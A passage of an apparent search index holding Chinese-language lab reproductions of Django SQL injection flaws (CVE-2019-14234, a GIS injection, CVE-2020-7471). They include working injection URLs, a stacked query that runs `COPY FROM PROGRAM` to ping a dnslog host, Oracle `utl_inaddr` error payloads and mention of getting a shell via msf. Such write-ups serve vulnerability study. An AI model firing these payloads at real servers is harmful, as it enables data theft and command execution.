Django\u901a\u5e38\u642d\u914dpostgresql\u6570\u636e\u5e93\uff0c\u800cJSONField\u662f\u8be5\u6570\u636e\u5e93\u7684\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002\u8be5\u6f0f\u6d1e\u7684\u51fa\u73b0\u7684\u539f\u56e0\u5728\u4e8eDjango\u4e2dJSONField\u7c7b\u7684\u5b9e\u73b0\uff0cDjango\u7684model\u6700\u672c\u8d28\u7684\u4f5c\u7528\u662f\u751f\u6210SQL\u8bed\u53e5\uff0c\u800c\u5728Django\u901a\u8fc7JSONField\u751f\u6210sql\u8bed\u53e5\u65f6\uff0c\u662f\u901a\u8fc7\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u62fc\u63a5\u3002 \u901a\u8fc7JSONField\u7c7b\u83b7\u5f97KeyTransform\u7c7b\u5e76\u751f\u6210sql\u8bed\u53e5\u7684\u4f4d\u7f6e\u3002 \u5176\u4e2dkey_name\u662f\u53ef\u63a7\u7684\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u751f\u6210\u7684\u8bed\u53e5\u662f WHERE (field->'[key_name]') ='value' 1 \uff0c\u56e0\u6b64\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165\u3002 0x03\u5f71\u54cd\u7248\u672c \u00b6 Django \u4e3b\u5f00\u53d1\u5206\u652f Django 2.2.x < 2.2.4 Django 2.1.x < 2.1.11 Django 1.11.x < 1.11.23 0x04\u73af\u5883\u642d\u5efa \u00b6 \u4f7f\u7528vulhub\u7684docker\u73af\u5883\u642d\u5efa vulhub\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/vulhub/vulhub cd vulhub/django/CVE-2019-14234/ docker-compose up -d \u5728\u6d4f\u89c8\u5668\u8bbf\u95eehttp://ip:8000\u51fa\u73b0\u4e00\u4e0b\u9875\u9762\u8bf4\u660e\u642d\u5efa\u6210\u529f 0x05\u6f0f\u6d1e\u5229\u7528 \u00b6 \u901a\u8fc7\u5bf9\u4ee3\u7801\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u77e5\u9053\u5982\u679c\u5728\u4f60\u7684Django\u4e2d\u4f7f\u7528\u4e86JSONField\u5e76\u4e14\u67e5\u8be2\u7684\u201c\u952e\u540d\u201d\u53ef\u63a7\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165 \u8bbf\u95eehttp://ip:8000/admin \u8f93\u5165\u7528\u6237\u540dadmin \uff0c\u5bc6\u7801a123123123 \u7136\u540e\u6784\u9020URL\u8fdb\u884c\u67e5\u8be2\uff0cpayload\uff1a http://ip:8000/admin/vuln/collection/?detail__a \u2019b=123 \u53ef\u4ee5\u770b\u5230\u4e0a\u56fe\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\uff0c\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u7ee7\u7eed\u6784\u9020payload http://ip:8000/admin/vuln/collection/?detail__title%27)%3d%271%27 or 1%3d1%2d%2d%20 1 \u7531\u4e8eor 1=1\u6c38\u4e3a\u771f\uff0c\u56e0\u6b64\u5e94\u8be5\u8fd4\u56de\u6240\u6709\u7ed3\u679c \u6211\u4eec\u7ed3\u5408CVE-2019-9193\u6211\u4eec\u5c1d\u8bd5\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u6784\u9020url\u5982\u4e0b http://192.168.10.195:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20 1 \u9875\u9762\u7ed3\u679c\u867d\u7136\u62a5\u9519\uff0c\u4f46\u662f\u62a5\u9519\u539f\u56e0\u662fno results to fetch\uff0c\u8bf4\u660e\u6211\u4eec\u7684\u8bed\u53e5\u5df2\u7ecf\u6267\u884c \u4f7f\u7528dnslog\u68c0\u6d4b\u662f\u5426\u53ef\u4ee5\u6267\u884c\u547d\u4ee4 Dnslog\u7f51\u5740\uff1a http://dnslog.cn/ Payload: http://192.168.10.195:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'ping k1anij.dnslog.cn '--%20 12 \u6210\u529f\u68c0\u6d4b\u5230\u6d41\u91cf \u590d\u73b0\u73af\u5883\u91cc\u7684postgresql\u6570\u636e\u5e93docker\u6ca1\u5bf9\u5916\u7684\u7aef\u53e3\u6620\u5c04\uff0c\u5982\u679c\u5f00\u4e86\u6216\u8005\u771f\u5b9e\u73af\u5883\u91cc\uff0c\u8fd8\u53ef\u4ee5\u7ed3\u5408msf\u901a\u8fc7CVE-2019-9193\u6765getshell 0x06\u4fee\u590d\u65b9\u5f0f \u00b6 \u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c","title":"CVE 2019 14234 Django JSONField SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#cve-2019-14234-django-jsonfield-sql","text":"\u6807\u7b7e\uff1a \u6f0f\u6d1e\u590d\u73b0 \u5b89\u5168","title":"CVE-2019-14234 Django JSONField SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x01","text":"Django\u662f\u4e00\u6b3e\u5e7f\u4e3a\u6d41\u884c\u7684\u5f00\u6e90web\u6846\u67b6\uff0c\u7531Python\u7f16\u5199\uff0c\u8bb8\u591a\u7f51\u7ad9\u548capp\u90fd\u57fa\u4e8eDjango\u5f00\u53d1\u3002 \u4ec0\u4e48\u662fJSONField\uff0cDjango\u662f\u4e00\u4e2a\u5927\u800c\u5168\u7684Web\u6846\u67b6\uff0c\u5176\u652f\u6301\u5f88\u591a\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5305\u62ecPostgresql\u3001Mysql\u3001Oracle\u3001Sqlite3\u7b49\uff0c\u4f46\u4e0eDjango\u5929\u751f\u4e3a\u4e00\u5bf9\u513f\u7684\u6570\u636e\u5e93\u83ab\u8fc7\u4e8ePostgresql\u4e86\uff0cDjango\u5b98\u65b9\u4e5f\u5efa\u8bae\u914d\u5408Postgresql\u4e00\u8d77\u4f7f\u7528\u3002 \u76f8\u6bd4\u4e8eMysql\uff0cPostgresql\u652f\u6301\u7684\u6570\u636e\u7c7b\u578b\u66f4\u52a0\u4e30\u5bcc\uff0c\u5176\u5bf9JSON\u683c\u5f0f\u6570\u636e\u7684\u652f\u6301\u4e5f\u8ba9\u8fd9\u4e2a\u5173\u7cfb\u578b\u6570\u636e\u5e93\u62e5\u6709\u4e86NoSQL\u7684\u4e00\u4e9b\u7279\u70b9\u3002","title":"0x01\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x02","text":"\u8be5\u6f0f\u6d1e\u9700\u8981\u5f00\u53d1\u8005\u4f7f\u7528\u4e86JSONField/HStoreField\uff0c\u4e14\u7528\u6237\u53ef\u63a7queryset\u67e5\u8be2\u65f6\u7684\u952e\u540d\uff0c\u5728\u952e\u540d\u7684\u4f4d\u7f6e\u6ce8\u5165SQL\u8bed\u53e5\u3002 Django\u901a\u5e38\u642d\u914dpostgresql\u6570\u636e\u5e93\uff0c\u800cJSONField\u662f\u8be5\u6570\u636e\u5e93\u7684\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002\u8be5\u6f0f\u6d1e\u7684\u51fa\u73b0\u7684\u539f\u56e0\u5728\u4e8eDjango\u4e2dJSONField\u7c7b\u7684\u5b9e\u73b0\uff0cDjango\u7684model\u6700\u672c\u8d28\u7684\u4f5c\u7528\u662f\u751f\u6210SQL\u8bed\u53e5\uff0c\u800c\u5728Django\u901a\u8fc7JSONField\u751f\u6210sql\u8bed\u53e5\u65f6\uff0c\u662f\u901a\u8fc7\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u62fc\u63a5\u3002 \u901a\u8fc7JSONField\u7c7b\u83b7\u5f97KeyTransform\u7c7b\u5e76\u751f\u6210sql\u8bed\u53e5\u7684\u4f4d\u7f6e\u3002 \u5176\u4e2dkey_name\u662f\u53ef\u63a7\u7684\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u751f\u6210\u7684\u8bed\u53e5\u662f WHERE (field->'[key_name]') ='value' 1 \uff0c\u56e0\u6b64\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165\u3002","title":"0x02\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x03","text":"Django \u4e3b\u5f00\u53d1\u5206\u652f Django 2.2.x < 2.2.4 Django 2.1.x < 2.1.11 Django 1.11.x < 1.11.23","title":"0x03\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x04","text":"\u4f7f\u7528vulhub\u7684docker\u73af\u5883\u642d\u5efa vulhub\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/vulhub/vulhub cd vulhub/django/CVE-2019-14234/ docker-compose up -d \u5728\u6d4f\u89c8\u5668\u8bbf\u95eehttp://ip:8000\u51fa\u73b0\u4e00\u4e0b\u9875\u9762\u8bf4\u660e\u642d\u5efa\u6210\u529f","title":"0x04\u73af\u5883\u642d\u5efa"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x05","text":"\u901a\u8fc7\u5bf9\u4ee3\u7801\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u77e5\u9053\u5982\u679c\u5728\u4f60\u7684Django\u4e2d\u4f7f\u7528\u4e86JSONField\u5e76\u4e14\u67e5\u8be2\u7684\u201c\u952e\u540d\u201d\u53ef\u63a7\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165 \u8bbf\u95eehttp://ip:8000/admin \u8f93\u5165\u7528\u6237\u540dadmin \uff0c\u5bc6\u7801a123123123 \u7136\u540e\u6784\u9020URL\u8fdb\u884c\u67e5\u8be2\uff0cpayload\uff1a http://ip:8000/admin/vuln/collection/?detail__a \u2019b=123 \u53ef\u4ee5\u770b\u5230\u4e0a\u56fe\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\uff0c\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u7ee7\u7eed\u6784\u9020payload http://ip:8000/admin/vuln/collection/?detail__title%27)%3d%271%27 or 1%3d1%2d%2d%20 1 \u7531\u4e8eor 1=1\u6c38\u4e3a\u771f\uff0c\u56e0\u6b64\u5e94\u8be5\u8fd4\u56de\u6240\u6709\u7ed3\u679c \u6211\u4eec\u7ed3\u5408CVE-2019-9193\u6211\u4eec\u5c1d\u8bd5\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u6784\u9020url\u5982\u4e0b http://192.168.10.195:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20 1 \u9875\u9762\u7ed3\u679c\u867d\u7136\u62a5\u9519\uff0c\u4f46\u662f\u62a5\u9519\u539f\u56e0\u662fno results to fetch\uff0c\u8bf4\u660e\u6211\u4eec\u7684\u8bed\u53e5\u5df2\u7ecf\u6267\u884c \u4f7f\u7528dnslog\u68c0\u6d4b\u662f\u5426\u53ef\u4ee5\u6267\u884c\u547d\u4ee4 Dnslog\u7f51\u5740\uff1a http://dnslog.cn/ Payload: http://192.168.10.195:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'ping k1anij.dnslog.cn '--%20 12 \u6210\u529f\u68c0\u6d4b\u5230\u6d41\u91cf \u590d\u73b0\u73af\u5883\u91cc\u7684postgresql\u6570\u636e\u5e93docker\u6ca1\u5bf9\u5916\u7684\u7aef\u53e3\u6620\u5c04\uff0c\u5982\u679c\u5f00\u4e86\u6216\u8005\u771f\u5b9e\u73af\u5883\u91cc\uff0c\u8fd8\u53ef\u4ee5\u7ed3\u5408msf\u901a\u8fc7CVE-2019-9193\u6765getshell","title":"0x05\u6f0f\u6d1e\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x06","text":"\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c","title":"0x06\u4fee\u590d\u65b9\u5f0f"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","text":"Django GIS SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 Django\u662fDjango\u57fa\u91d1\u4f1a\u7684\u4e00\u5957\u57fa\u4e8ePython\u8bed\u8a00\u7684\u5f00\u6e90Web\u5e94\u7528\u6846\u67b6\u3002\u8be5\u6846\u67b6\u5305\u62ec\u9762\u5411\u5bf9\u8c61\u7684\u6620\u5c04\u5668\u3001\u89c6\u56fe\u7cfb\u7edf\u3001\u6a21\u677f\u7cfb\u7edf\u7b49\u3002 Django 1.11.29\u4e4b\u524d\u76841.11.x\u7248\u672c\u30012.2.11\u4e4b\u524d\u76842.2.x\u7248\u672c\u548c3.0.4\u4e4b\u524d\u76843.0.x\u7248\u672c\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684SQL\u8bed\u53e5\u5229\u7528\u8be5\u6f0f\u6d1e\u67e5\u770b\u3001\u6dfb\u52a0\u3001\u4fee\u6539\u6216\u5220\u9664\u6570\u636e\u5e93\u4e2d\u7684\u4fe1\u606f\u3002 \u6f0f\u6d1e\u73af\u5883 \u00b6 \u73af\u5883\u642d\u5efa \uff0c\u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8000\u5373\u53ef\u770b\u5230Django\u9ed8\u8ba4\u9996\u9875\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 payload1\uff1a \u8bbf\u95eehttp://your-ip:8000/vuln/\uff0c\u5728\u8be5\u7f51\u9875\u4e2d\u4f7f\u7528get\u65b9\u6cd5\u6784\u9020q\u7684\u53c2\u6570\uff0c\u6784\u9020SQL\u6ce8\u5165\u7684\u5b57\u7b26\u4e32 20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1 payload2\uff1a \u8bbf\u95eehttp://your-ip:8000/vuln2/\u3002 \u5728\u8be5\u7f51\u9875\u4e2d\u4f7f\u7528get\u65b9\u6cd5\u6784\u9020q\u7684\u53c2\u6570\uff0c\u6784\u9020\u51faSQL\u6ce8\u5165\u7684\u5b57\u7b26\u4e32 0.05))) FROM \"VULN_COLLECTION2\" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null -- http://your-ip:8000/vuln/?q = 20 ) %20%3D%201%20OR%20 ( select %20utl_inaddr.get_host_name (( SELECT%20version%20FROM%20v%24instance )) %20from%20dual ) %20is%20null%20%20OR%20 ( 1 %2B1 1 http://your-ip:8000/vuln2/?q = 0 .05 ))) %20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20 ( select %20utl_inaddr.get_host_name (( SELECT%20user%20FROM%20DUAL )) %20from%20dual ) %20is%20not%20null%20%20-- 1 \u53ef\u89c1\uff0c\u62ec\u53f7\u5df2\u6ce8\u5165\u6210\u529f\uff0cSQL\u8bed\u53e5\u67e5\u8be2\u62a5\u9519\uff1a","title":"Django GIS SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#django-gis-sql","text":"","title":"Django GIS SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_1","text":"Django\u662fDjango\u57fa\u91d1\u4f1a\u7684\u4e00\u5957\u57fa\u4e8ePython\u8bed\u8a00\u7684\u5f00\u6e90Web\u5e94\u7528\u6846\u67b6\u3002\u8be5\u6846\u67b6\u5305\u62ec\u9762\u5411\u5bf9\u8c61\u7684\u6620\u5c04\u5668\u3001\u89c6\u56fe\u7cfb\u7edf\u3001\u6a21\u677f\u7cfb\u7edf\u7b49\u3002 Django 1.11.29\u4e4b\u524d\u76841.11.x\u7248\u672c\u30012.2.11\u4e4b\u524d\u76842.2.x\u7248\u672c\u548c3.0.4\u4e4b\u524d\u76843.0.x\u7248\u672c\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684SQL\u8bed\u53e5\u5229\u7528\u8be5\u6f0f\u6d1e\u67e5\u770b\u3001\u6dfb\u52a0\u3001\u4fee\u6539\u6216\u5220\u9664\u6570\u636e\u5e93\u4e2d\u7684\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_2","text":"\u73af\u5883\u642d\u5efa \uff0c\u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8000\u5373\u53ef\u770b\u5230Django\u9ed8\u8ba4\u9996\u9875\u3002","title":"\u6f0f\u6d1e\u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20GIS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_3","text":"payload1\uff1a \u8bbf\u95eehttp://your-ip:8000/vuln/\uff0c\u5728\u8be5\u7f51\u9875\u4e2d\u4f7f\u7528get\u65b9\u6cd5\u6784\u9020q\u7684\u53c2\u6570\uff0c\u6784\u9020SQL\u6ce8\u5165\u7684\u5b57\u7b26\u4e32 20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1 payload2\uff1a \u8bbf\u95eehttp://your-ip:8000/vuln2/\u3002 \u5728\u8be5\u7f51\u9875\u4e2d\u4f7f\u7528get\u65b9\u6cd5\u6784\u9020q\u7684\u53c2\u6570\uff0c\u6784\u9020\u51faSQL\u6ce8\u5165\u7684\u5b57\u7b26\u4e32 0.05))) FROM \"VULN_COLLECTION2\" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null -- http://your-ip:8000/vuln/?q = 20 ) %20%3D%201%20OR%20 ( select %20utl_inaddr.get_host_name (( SELECT%20version%20FROM%20v%24instance )) %20from%20dual ) %20is%20null%20%20OR%20 ( 1 %2B1 1 http://your-ip:8000/vuln2/?q = 0 .05 ))) %20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20 ( select %20utl_inaddr.get_host_name (( SELECT%20user%20FROM%20DUAL )) %20from%20dual ) %20is%20not%20null%20%20-- 1 \u53ef\u89c1\uff0c\u62ec\u53f7\u5df2\u6ce8\u5165\u6210\u529f\uff0cSQL\u8bed\u53e5\u67e5\u8be2\u62a5\u9519\uff1a","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/","text":"Django SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-7471\uff09\u590d\u73b0 \u00b6 \u7b80\u4ecb \u00b6 Django \u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u901a\u544a\u516c\u5e03\u4e86\u4e00\u4e2a\u901a\u8fc7StringAgg\uff08\u5206\u9694\u7b26\uff09\u5b9e\u73b0\u5229\u7528\u7684\u6f5c\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-7471\uff09\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020\u5206\u9694\u7b26\u4f20\u9012\u7ed9\u805a\u5408\u51fd\u6570contrib.postgres.aggregates.StringAgg\uff0c\u4ece\u800c\u7ed5\u8fc7\u8f6c\u4e49\u5e76\u6ce8\u5165\u6076\u610fSQL\u8bed\u53e5\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Django 1.11.x < 1.11.28 Django 2.2.x < 2.2.10 Django 3.0.x < 3.0.3 Django \u4e3b\u5f00\u53d1\u5206\u652f \u73af\u5883\u642d\u5efa \u00b6 \u5b89\u88c5Django\uff08v3.0.2\uff09 pip3 install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple \u5b89\u88c5postgres apt-get install postgresql-11 \u5f00\u542f\u670d\u52a1\u5e76\u767b\u5f55\u8d26\u53f7postgres \u5bc6\u7801\u4e3a\u7a7a \u7ed9\u6570\u636e\u5e93\u8d85\u7ea7\u7528\u6237postgres\u6dfb\u52a0\u5bc6\u7801123456 \u7136\u540e\u521b\u5efa\u6570\u636e\u5e93 Poc\u5730\u5740\uff1a https://github.com/Saferman/CVE-2020-7471.git \u4fee\u6539 sqlvul_projects/settings.py \u4fee\u6539\u76f8\u5173\u914d\u7f6e\u4fe1\u606f\uff0c\u6211\u8fd9\u91cc\u4fee\u6539\u4e86\u5bc6\u7801\u5176\u4ed6\u4e00\u6837\u5373\u53ef \u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528manage.py\u8fdb\u884c\u521d\u59cb\u5316\u548c\u914d\u7f6e\u4e86 \u521d\u59cb\u5316\u6570\u636e\u8868(django) python3 manage.py migrate python3 manage.py makemigrations vul_app python3 manage.py migrate vul_app \u4f9d\u6b21\u6267\u884c\u547d\u4ee4\u67e5\u770bvul_app_info\u91cc\u662f\u5426\u6709\u5185\u5bb9 sudo -i -u postgres psql \\c test \\d select * from vul_app_info; \u6ca1\u6709 \u6f0f\u6d1e\u590d\u73b0 \u8fd0\u884c POC \u811a\u672c\uff08CVE-2020-7471.py\uff09\u67e5\u770b\u7ed3\u679c \u56de\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u53d1\u73b0\u5b58\u5728\u5185\u5bb9\u4e86\uff0c\u6210\u529f \u4fee\u590d\u5efa\u8bae \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"Django SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE 2020 7471\uff09\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#django-sqlcve-2020-7471","text":"","title":"Django SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-7471\uff09\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_1","text":"Django \u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u901a\u544a\u516c\u5e03\u4e86\u4e00\u4e2a\u901a\u8fc7StringAgg\uff08\u5206\u9694\u7b26\uff09\u5b9e\u73b0\u5229\u7528\u7684\u6f5c\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-7471\uff09\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020\u5206\u9694\u7b26\u4f20\u9012\u7ed9\u805a\u5408\u51fd\u6570contrib.postgres.aggregates.StringAgg\uff0c\u4ece\u800c\u7ed5\u8fc7\u8f6c\u4e49\u5e76\u6ce8\u5165\u6076\u610fSQL\u8bed\u53e5\u3002","title":"\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_2","text":"Django 1.11.x < 1.11.28 Django 2.2.x < 2.2.10 Django 3.0.x < 3.0.3 Django \u4e3b\u5f00\u53d1\u5206\u652f","title":"\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_3","text":"\u5b89\u88c5Django\uff08v3.0.2\uff09 pip3 install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple \u5b89\u88c5postgres apt-get install postgresql-11 \u5f00\u542f\u670d\u52a1\u5e76\u767b\u5f55\u8d26\u53f7postgres \u5bc6\u7801\u4e3a\u7a7a \u7ed9\u6570\u636e\u5e93\u8d85\u7ea7\u7528\u6237postgres\u6dfb\u52a0\u5bc6\u7801123456 \u7136\u540e\u521b\u5efa\u6570\u636e\u5e93 Poc\u5730\u5740\uff1a https://github.com/Saferman/CVE-2020-7471.git \u4fee\u6539 sqlvul_projects/settings.py \u4fee\u6539\u76f8\u5173\u914d\u7f6e\u4fe1\u606f\uff0c\u6211\u8fd9\u91cc\u4fee\u6539\u4e86\u5bc6\u7801\u5176\u4ed6\u4e00\u6837\u5373\u53ef \u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528manage.py\u8fdb\u884c\u521d\u59cb\u5316\u548c\u914d\u7f6e\u4e86 \u521d\u59cb\u5316\u6570\u636e\u8868(django) python3 manage.py migrate python3 manage.py makemigrations vul_app python3 manage.py migrate vul_app \u4f9d\u6b21\u6267\u884c\u547d\u4ee4\u67e5\u770bvul_app_info\u91cc\u662f\u5426\u6709\u5185\u5bb9 sudo -i -u postgres psql \\c test \\d select * from vul_app_info; \u6ca1\u6709 \u6f0f\u6d1e\u590d\u73b0 \u8fd0\u884c POC \u811a\u672c\uff08CVE-2020-7471.py\uff09\u67e5\u770b\u7ed3\u679c 